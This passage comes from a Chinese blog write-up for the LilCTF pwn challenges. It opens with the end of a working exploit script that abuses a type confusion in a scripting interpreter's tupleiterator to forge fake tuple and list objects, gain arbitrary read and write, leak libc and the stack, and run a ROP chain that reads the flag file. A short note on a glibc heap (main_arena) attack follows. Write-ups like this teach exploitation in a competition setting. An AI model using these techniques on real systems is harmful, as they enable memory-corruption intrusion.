+
+    print(hex(fake_tuple_str_addr))
+    print(hex(fake_tuple_str_addr2))
+    print(hex(id(fake_array)))
+    # print(next(fake_iter))
+    let varA = (float_to_int64(next(fake_iter)) &gt;&gt; 8) &amp; 0xffffffffffff
+
+    for i in range(fake_array_addr, varA-48, 8):
+        next(fake_iter)
+    let my_space = (float_to_int64(next(fake_iter)) &gt;&gt; 8) &amp; 0xffffffffffff
+
+    print(hex(varA))
+
+    let id_addr = id(id)
+    let fake_group = 8.to_bytes(16, 'little')
+    fake_group += 0x1000.to_bytes(8, 'little')
+    fake_group += 0x1000.to_bytes(8, 'little')
+    fake_group += (my_space+32).to_bytes(8, 'little')
+    fake_group += (0x7ffd000000000000|(my_space+48)).to_bytes(8, 'little')
+
+    let fake_list = 6.to_bytes(16,'little')
+    fake_list += list_class.to_bytes(48, 'little')
+    fake_list += 0x400000000000.to_bytes(8, 'little')
+    fake_list += 0x400000000000.to_bytes(8, 'little')
+    fake_list += id(id).to_bytes(8, 'little')
+
+    for i in range(0, len(fake_group)):
+        fake_array[i]=fake_group[i]
+    for i in range(0, len(fake_list)):
+        fake_array[i+len(fake_group)]=fake_list[i]
+
+    let fake_iter2 = tupleiterator(my_space)
+    print(hex(my_space))
+    print(hex(float_to_int64(next(fake_iter2))))
+    let b = next(fake_iter2)
+    let pie = b[2]
+
+    pie = float_to_int64(pie)-0x5a40-0x7000
+    print(hex(my_space))
+    print(hex(id(id)))
+
+    let index = my_space+0x80-id(id)
+    index = index&gt;&gt;3
+    let base = float_to_int64(b[index])
+    let stdout_pie = create_float(pie+0x99560)
+    # print(hex(my_space))
+    b[index] = stdout_pie
+
+    let stdout = float_to_int64(b[0])
+    let libcbase = stdout-0x2045c0
+    let env_addr = libcbase + 0x20ad58
+    # print(hex(libcbase))
+    index = (env_addr-pie-0x99560)&gt;&gt;3
+    let stack = parse_float(b[index])-0x138
+    print(hex(stack))
+    index = (stack -pie-0x99560)&gt;&gt;3
+    let flag = stack-0x30
+    let rdi = 0x10f75b+libcbase
+    let saddr = libcbase + 0xeef30
+    let rsi =0x0110a4d+libcbase
+    let edx = libcbase + 0xb5db0
+    # b[index-2]=create_float(0x6c6166646561722f)
+    b[index-6]=create_float(0x616c66646165722f)
+    b[index-5]=create_float(0x67)
+    # b[index-6]=create_float(rdi+1)
+    # b[index-5]=create_float(rdi+1)
+    b[index-4]=create_float(rdi+1)
+    b[index-3]=create_float(rdi+1)
+    b[index-2]=create_float(rdi+1)
+    b[index-1]=create_float(rdi+1)
+    b[index]=create_float(rdi+1)
+    b[index+1]=create_float(rdi+1)
+    b[index+2]=create_float(rdi+1)
+    b[index+3]=create_float(rdi+1)
+    b[index+4]=create_float(rdi+1)
+    b[index+5]=create_float(rdi+1)
+    b[index+6]=create_float(rdi+1)
+    b[index+7]=create_float(rdi+1)
+    b[index+8]=create_float(rdi+1)
+    b[index+9]=create_float(rdi+1)
+    b[index+10]=create_float(rdi+1)
+    # b[index+1]=create_float(rdi+1)
+    b[index+11]=create_float(rdi)
+    b[index+12]=create_float(flag)
+    b[index+13]=create_float(rsi)
+    b[index+14]=create_float(0)
+    b[index+15]=create_float(edx)
+    b[index+16]=create_float(saddr)
+
+pwn()
+
+def exit():
+    return
+
+# while True:
+    # let _daimi = 1
+</code></pre>
+<p>好吧我并不知道怎么转float和int64，所以让ai用纯数学方法写了一版</p>
+<p>（最后快做不完了于是便找出题人要了转化函数）</p>
+<p>（尽管最后还是没在时间内做出来wuwu）</p>
+<p>漏洞在tupleiterator()里面，直接传数字x进去，就会把数字x所在地址当作对象并构造迭代器</p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202508/3562901-20250818161547977-1262169644.png" alt="PixPin_2025-08-18_14-46-10" loading="lazy"></p>
+<p>可以看到成功crush。然后考虑配合id泄露出来的栈地址来伪造对象。</p>
+<p>动调+ida可以看到，元组对象和列表对象大概是这样的</p>
+<pre><code class="language-c">struct KrkInstance // sizeof=0x40 
+                   // 列表属于instance，可以通过查看flag得到
+{                                       // XREF: Lock/r Thread/r ...
+    KrkObj obj;
+    KrkClass *_class;
+    KrkTable fields;
+};
+
+
+
+struct KrkObj       // type最重要，其余随意
+{
+  uint16_t type;
+  uint16_t flags;
+  uint32_t hash;
+  KrkObj *next;
+};
+
+struct KrkTable
+{
+  size_t count;         
+  size_t capacity;
+  size_t used;          //这三个关系到对象的大小
+  KrkTableEntry *entries;   //这里是一个对象指针
+  ssize_t *indexes;
+};
+
+/* 77 */
+typedef unsigned __int16 __uint16_t;
+
+/* 62 */
+typedef __uint16_t uint16_t;
+
+/* 28 */
+typedef unsigned int __uint32_t;
+
+/* 15 */
+typedef __uint32_t uint32_t;
+
+/* 66 */
+struct KrkObj
+{
+  uint16_t type;
+  uint16_t flags;
+  uint32_t hash;
+  KrkObj *next;
+};
+
+struct KrkTuple     // 元组则有些许不同
+{                   // 可以看到元组比list小得多
+  KrkObj obj;
+  KrkValueArray values;
+};
+
+struct KrkValueArray
+{
+  size_t capacity;
+  size_t count;
+  KrkValue *values;
+};
+</code></pre>
+<p>因为id可以泄露对象的地址，而对象里的指针和标记值我们往往是无法控制的</p>
+<p>但我们可以控制对象指针指向的内容（比如说，list里的内容）</p>
+<p>我们期望找到一种对象，他的内容紧邻对象本身分配。</p>
+<p>（没有调试过局部变量情况的，后面可以补一下）</p>
+<p>（如果有想复现这题的师傅，简易所有变量用函数包起来变成局部变量）</p>
+<p>（全部全局变量的话会有奇怪的问题，调试感觉是编译器会一次性读取全部全局变量）</p>
+<p>（然后再进行优化与分配，这样会导致一个问题）</p>
+<p>（就是可能你后面写代码新建对象会影响到先前变量的分配。。。）</p>
+<p>最后调试发现两种对象可以，分别是bytes字符数组和str字符串（均有大小限制）</p>
+<p>最后为了方便选取字符数组，用to_bytes可以方便地转化</p>
+<p>然后我们伪造如下对象</p>
+<pre><code> 00 0008    // flags tuple
++08         // next 下一个对象 我们不关心这个，所以随意
++10 2^52    // capacity
++18 2^52    // counts
++20 id_addr // id(id) gdb可以在附近发现pie指针
+            // 用其它函数也可以
+</code></pre>
+<p>伪造完毕后可以用next读取id对象附近内存</p>
+<p>但是tuple目前只能读，我们还期望构造出任意写，这样才可以进行攻击</p>
+<p>任意写的话就要构造list，但是实测由于list对象太大，没办法紧贴对象直接伪造出来</p>
+<p>所以用我们刚刚获得的任意读来直接拿到一片我们可控的内存</p>
+<pre><code class="language-python">let b = bytesarray(0x1000)
+b_addr = id(b)
+for i in range(id(id), id(b), 8):
+    next(fake_iter)
+
+let b_array_addr = next(fake_iter)
+
+# 然后我们还要从array对象中拿内存地址
+# 注意这个内存地址是带flags的，如果你直接用iter去读
+# 会读出来0x1000个bytes
+# 我的解决办法是在最初初始化的时候使指针往下偏移一位
+# 这样iter就不会识别到指针，我们再从错位的数据里提取出地址
+</code></pre>
+<p>于是我们拿到了一大片可读可写的空间，我们将在这里继续进行我们的攻击</p>
+<p>构造</p>
+<pre><code class="language-c">00  6               // type=instance
+08  0       
+10  list_class      // id(list.__class__)
+--
+40  big_num
+48  big_num
+50  value_ptr
+</code></pre>
+<p>这样猛猛构造一通以后，我们再用刚才的漏洞拿到fake_iter2</p>
+<p>此时你就会惊喜地发现，怎么还是返回double</p>
+<p>（那哪里来任意写呢？iter又不支持我们写）</p>
+<p>正常情况下，iter只会返回元组或列表里的内容，既然你的指针指向一个无标识的double，那当然就是返回double咯</p>
+<p>但让我们换个思路，如果是一个元组套列表，iter会返回什么？</p>
+<p>会返回一个完全由我们伪造的列表！</p>
+<p>然后如果我们让这个列表的长度超级大，我们就能实现任意读写。</p>
+<p>最后我们用这个任意读写打rop执行/readflag即可</p>
+<p>（试了system，因为神秘的原因运行不了，好奇怪）</p>
+<h1 id="heap-pivoting">heap-pivoting</h1>
+<p>什么打歪了</p>
+<p>unsorted bin attack 打堆列表，拿到直接编辑main arena</p>
+<p>然后编辑arena，topchunk改到堆列表上</p>
+<p>alloc完直接拿任意写然后秒了</p>
+<p>（topchunk改歪了导致top chunk size=0 崩溃了）</p>
+<p>（居然因为这个原因没做出来吗。。。哈基呆你真是。。。）</p>
+<p>（我以为有页对齐检查于是睡觉了）</p>
+<p>（？？？）</p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202508/3562901-20250818161706509-1625146964.png" alt="TZ8S`PBSGLGAKG~AMV@9RD" loading="lazy"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202508/3562901-20250818161722579-2048915724.png" alt="UJ68AEH@$J43@_TF{@HV" loading="lazy"></p>
+
+
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo" class="post-meta-container">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2025-08-18 16:19">2025-08-18 16:18</span>&nbsp;
+<a href="https://www.cnblogs.com/undefined">imiab</a>&nbsp;
+阅读(<span id="post_view_count">884</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19044898);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fundefined%2Fp%2F19044898&targetId=19044898&targetType=0" target="_blank">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script>
+    var cb_entryId = 19044898, cb_entryCreatedDate = '2025-08-18 16:18', cb_postType = 1, cb_postTitle = 'Lilctf PWN方向全全全全题解！';
+    var allowComments = true, cb_blogId = 841504, cb_blogApp = 'undefined', cb_blogUserGuid = '8a0895b2-d2a5-4d98-c91d-08dd08913576';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");    
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav">
+        <div class="comment-nav-right">
+            <span id="span_refresh_tips"></span><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a>
+        </div>
+    </div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+        <div id="blog_c1" class="under-post-card below-post-card">
+            <a href="https://www.doubao.com/download/desktop?ug_apk_token=FxCjd" rel="nofollow" target="_blank" onclick="countCreativeClicks('C1-字节-豆包')">
+                <img src="https://img2024.cnblogs.com/blog/35695/202609/35695-20260905201441417-1701437871.webp" onload="countCreativeImpressions('C1-字节-豆包')" alt="" style="width:300px!important;height:250px!important;min-width:300px!important;max-width:300px!important;" />
+                <span id="c1_impression" style="display:none"></span>
+            </a>
+        </div>
+    <div id="under_post_card1"></div>
+    <div id="related_posts_card"></div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card below-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+            setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+            LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div>
+	</div>
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+					<script>loadBlogSideColumn()</script>
+			</div>			
+		</div>
+	</div>
+	<div class="clear"></div>
+	</div>
+	<div class="clear"></div>
+	<div id="footer">
+		<a href="https://www.cnblogs.com/" id="footer_site_link" class="footer-brand">博客园</a>
+<span class="footer-copyright"> &nbsp;&copy;&nbsp; 2004-2026</span>
+<br /><span class="footer-icp">
+    <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771"><img src="//assets.cnblogs.com/images/ghs.png" />浙公网安备 33010602011771号</a>
+    <a href="https://beian.miit.gov.cn" target="_blank">浙ICP备2021040463号-3</a>
+</span>
+
+
+
+	</div>
+</div>
+
+
+
+    <div id="page_end_html">
+        <script src="https://cdn.cnblogs.com/awescnb/index.js"></script>
+<script>
+  const opts = {
+    bodyBackground: {
+        enable: true,
+        value:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312133253_meiying.jpg',
+        opacity: 0.85,
+        repeat: true,
+    },
+    theme: {
+      name: 'geek',
+      avatar:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312125116_QQ%E5%9B%BE%E7%89%8720240807015716.jpg',
+    },
+    darkMode: {
+        enable: true,
+        darkDefault: false,
+    },
+  signature: {
+      enable: false,
+      contents: [
+      "",
+      ],
+    },
+  }
+  $.awesCnb(opts)
+</script>
+    </div>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8Ow5-In01nBEvFwaadRGjqGcULzDfVYTsYv2mHQqjirE_XKz-fiufqeDQHDa-s6kH8db1qnPMN011eFqWRqxpEyZ5r5aTaDhNbBynbcm1lt66JkWz5_hkXNlsVUatcOC8aSfYjxFYyO6gyfrcdwO52E" />
+    <script defer src="https://hm.baidu.com/hm.js?866c9be12d4a814454792b1fd0fed295"></script>
+<script defer src="https://lf1-cdn-tos.bytegoofy.com/goofy/ttzz/push.js?32d945448dd797af605da9156763de3dc11c9886368d0f917d6388e4fcf5542030632485602430134f60bc55ca391050b680e2741bf7233a8f1da9902314a3fa" id="ttzz"></script>
+</body>
+</html>
